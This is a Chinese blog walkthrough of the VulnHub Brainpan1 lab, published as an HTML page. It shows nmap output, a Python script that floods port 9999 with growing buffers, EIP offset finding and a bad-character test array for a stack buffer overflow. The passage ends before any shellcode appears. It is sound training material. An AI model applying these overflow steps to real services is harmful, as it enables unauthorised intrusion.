@@ -1,0 +1,875 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/24.png">
+  <link rel="icon" href="/img/24.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jimi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="tips： 缓冲区溢出（构造 eip 指向 esp、  esp 构造 shellcode） vlum-nmap漏洞探测 wfuzz目录爆破 msf-pattern badchars坏字节 Immunity Debugger -&gt;mona.py Msfvenom构造shellcode!&#x2F;bin&#x2F;bash（提权） 端口探测锁定靶机 ip  全端口扫描 发现两个端口  9999">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-brainpan1">
+<meta property="og:url" content="https://jimi-lab.github.io/2025/06/02/vulnhub-Brainpan1/index.html">
+<meta property="og:site_name" content="Jimi&#39;s blog">
+<meta property="og:description" content="tips： 缓冲区溢出（构造 eip 指向 esp、  esp 构造 shellcode） vlum-nmap漏洞探测 wfuzz目录爆破 msf-pattern badchars坏字节 Immunity Debugger -&gt;mona.py Msfvenom构造shellcode!&#x2F;bin&#x2F;bash（提权） 端口探测锁定靶机 ip  全端口扫描 发现两个端口  9999">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/1.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/2.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/3.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/4.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/5.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/6.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/7.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/8.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/9.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/10.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/11.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/12.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/13.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/14.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/15.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/17.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/18.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/19.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/20.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/21.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/22.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/23.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/24.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/25.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/26.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/27.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/28.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/29.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/30.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/31.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/32.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/33.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/34.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/35.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/36.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/37.png">
+<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/38.png">
+<meta property="article:published_time" content="2025-06-02T11:24:39.000Z">
+<meta property="article:modified_time" content="2025-06-02T11:29:23.484Z">
+<meta property="article:author" content="Jimi">
+<meta property="article:tag" content="Vulnhub靶场">
+<meta property="article:tag" content="缓冲区溢出（构造 eip 指向 esp、 esp 构造 shellcode）">
+<meta property="article:tag" content="vlum-nmap漏洞探测">
+<meta property="article:tag" content="wfuzz目录爆破">
+<meta property="article:tag" content="msf-pattern">
+<meta property="article:tag" content="badchars坏字节">
+<meta property="article:tag" content="Immunity Debugger -&gt;mona.py">
+<meta property="article:tag" content="Msfvenom构造shellcode!&#x2F;bin&#x2F;bash（提权）">
+<meta property="article:tag" content="ret2libc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jimi-lab.github.io/img/vulnhub-Brainpan1.md/1.png">
+  
+  
+  
+  <title>vulnhub-brainpan1 - Jimi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/background_video.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"jimi-lab.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Jimi</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/redCar.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulnhub-brainpan1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-02 19:24" pubdate>
+          2025年6月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">vulnhub-brainpan1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><em><strong>tips：</strong></em></p>
+<p><em><strong>缓冲区溢出（构造 eip 指向 esp、  esp 构造 shellcode）</strong></em></p>
+<p><em><strong>vlum-nmap漏洞探测</strong></em></p>
+<p><em><strong>wfuzz目录爆破</strong></em></p>
+<p><em><strong>msf-pattern</strong></em></p>
+<p><em><strong>badchars坏字节</strong></em></p>
+<p><em><strong>Immunity Debugger -&gt;mona.py</strong></em></p>
+<p><em><strong>Msfvenom构造shellcode!&#x2F;bin&#x2F;bash（提权）</strong></em></p>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>锁定靶机 ip</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/1.png"></p>
+<h4 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h4><p><img src="/../img/vulnhub-Brainpan1.md/2.png"></p>
+<p>发现两个端口  9999 10000</p>
+<h5 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h5><p><img src="/../img/vulnhub-Brainpan1.md/3.png"></p>
+<h5 id="TCP-扫描"><a href="#TCP-扫描" class="headerlink" title="TCP 扫描"></a>TCP 扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p9999,10000 192.168.17.144<br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 13:54 EDT<br>Nmap scan report for 192.168.17.144<br>Host is up (0.00083s latency).<br><br>PORT      STATE SERVICE VERSION<br>9999/tcp  open  abyss?<br>| fingerprint-strings: <br>|   NULL: <br>|     _| _| <br>|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| <br>|     _|_| _| _| _| _| _| _| _| _| _| _| _|<br>|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|<br>|     [________________________ WELCOME TO BRAINPAN _________________________]<br>|_    ENTER THE PASSWORD<br>10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port9999-TCP:V=7.95%I=7%D=6/1%Time=683C93E0%P=x86_64-pc-linux-gnu%r(NUL<br>SF:L,298,&quot;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\<br>SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x<br>SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2<br>SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2<br>SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2<br>SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\<br>SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2<br>SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2<br>SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2<br>SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\<br>SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2<br>SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x<br>SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2<br>SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2<br>SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x<br>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&quot;);<br>MAC Address: 00:0C:29:86:CE:1D (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 2.6.X|3.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3<br>OS details: Linux 2.6.32 - 3.10<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 41.15 seconds<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="vlum-扫描"><a href="#vlum-扫描" class="headerlink" title="vlum 扫描"></a>vlum 扫描</h5><p>Nmap 的漏洞扫描将针对目标运行该工具的默认漏洞扫描脚本。这些对于查找可利用的常见漏洞非常有用。</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/4.png"></p>
+<h3 id="10000-端口"><a href="#10000-端口" class="headerlink" title="10000 端口"></a>10000 端口</h3><p>浏览器访问：192.168.17.144：10000</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/5.png"></p>
+<h4 id="目录爆破："><a href="#目录爆破：" class="headerlink" title="目录爆破："></a>目录爆破：</h4><p>wfuzz 工具</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/6.png"></p>
+<p>进入 bin 目录下</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/7.png"></p>
+<p>下载到本地</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/8.png"></p>
+<p><img src="/../img/vulnhub-Brainpan1.md/9.png"></p>
+<h3 id="9999-端口"><a href="#9999-端口" class="headerlink" title="9999 端口"></a>9999 端口</h3><p><img src="/../img/vulnhub-Brainpan1.md/10.png"></p>
+<p>nc 尝试：</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/11.png"></p>
+<p>有可以输入的地方，但是还不知道如何利用</p>
+<h3 id="brainpan-exe"><a href="#brainpan-exe" class="headerlink" title="brainpan.exe"></a>brainpan.exe</h3><p>win10 虚拟机运行后，kali 连接</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/12.png"></p>
+<p><img src="/../img/vulnhub-Brainpan1.md/13.png"></p>
+<p><strong>根据这个提示，copied * to buffer，猜测，是否有缓冲区溢出漏洞？</strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">确定溢出大小 -&gt; 控制 eip</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">-&gt; 寻找 jmp esp -&gt; 测试坏字符</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">-&gt; 生成shellcode -&gt; 添加适量的nop</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">-&gt; 开始攻击</font></strong></p>
+<p>139 个字符都不溢出</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/14.png"></p>
+<h4 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h4><p>写一个自动测试溢出的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br>size = <span class="hljs-number">100</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[+] Send evil buffer %s bytes&quot;</span> % size <br>        buffer = <span class="hljs-string">&#x27;A&#x27;</span> * size<br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        s.connect((<span class="hljs-string">&quot;192.168.17.144&quot;</span>,<span class="hljs-number">9999</span>))<br>        s.send(buffer)<br>        s.close()<br><br>        size += <span class="hljs-number">100</span><br>        time.sleep(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] Could not connect.&quot;</span>)<br>        sys.exit()<br><br><br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>成功运行脚本，最多能发 700 字节</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/15.png"></p>
+<h4 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h4><p><img src="/../img/vulnhub-Brainpan1.md/17.png"></p>
+<p>注意 <strong>EIP</strong> 的地址：35724134（EIP 始终指向当前正在执行的指令之后的那条指令的内存地址。CPU 根据 EIP 的值从内存中读取指令并执行，执行完毕后 EIP 会自动递增（或根据跳转指令修改）以指向下一条指令。）</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/18.png"></p>
+<p><img src="/../img/vulnhub-Brainpan1.md/19.png"></p>
+<p>精确的匹配在 524 这个位置上（A 储存在 EDX 寄存器中）</p>
+<p>重新构造 exp</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/20.png"></p>
+<p>发送 exp，查看寄存器信息</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/21.png"></p>
+<p>说明找到的 eip 是正确的（利用的话，在 eip 之后就可以存放 shellcode，把我们的反弹信息放i进去）</p>
+<p>目前 C 仅有 72 字节，正常 payload 的大小为** 350-400 字节**</p>
+<p>那么如何利用呢？</p>
+<h4 id="扩容-esp"><a href="#扩容-esp" class="headerlink" title="扩容 esp"></a>扩容 esp</h4><p>修改 exp 中 C 的大小为 500，发送 exp</p>
+<p>接受之后，在栈中查看 esp 的大小（0x005FFAE4-0x005FF910 &#x3D; 0x1D4）468 个字节</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/22.png"></p>
+<p><img src="/../img/vulnhub-Brainpan1.md/23.png"></p>
+<p><img src="/../img/vulnhub-Brainpan1.md/24.png"></p>
+<p>468 字节！</p>
+<p>大小合适！</p>
+<p>说明 esp 的空间可以为我所用！</p>
+<h5 id="验证-esp-中有哪些坏字符"><a href="#验证-esp-中有哪些坏字符" class="headerlink" title="验证 esp 中有哪些坏字符"></a>验证 esp 中有哪些坏字符</h5><p>（c 语言程序中 0x00 默认就是坏字节）</p>
+<p>GitHub：badchars</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/25.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~/VulnHub/Brainpan1/badchars]<br>└─$ ./badchars -f ruby<br>badchars = (<br>  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot; +<br>  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot; +<br>  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot; +<br>  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot; +<br>  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot; +<br>  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot; +<br>  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot; +<br>  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot; +<br>  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot; +<br>  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot; +<br>  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot; +<br>  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot; +<br>  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot; +<br>  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot; +<br>  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot; +<br>  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;<br>)<br><br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>修改 exp</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/26.png"></p>
+<p>发送 exp，查看 esp 内存中的值</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/27.png"></p>
+<p>可以看到 01-FF 都在内存中连续，正确的展示出来了，说明该程序中<strong>没有坏字节</strong></p>
+<p>若内存中本该出现 01-FF 的内存中出现了 00 或者间断的字节内容，就说明存在坏字节</p>
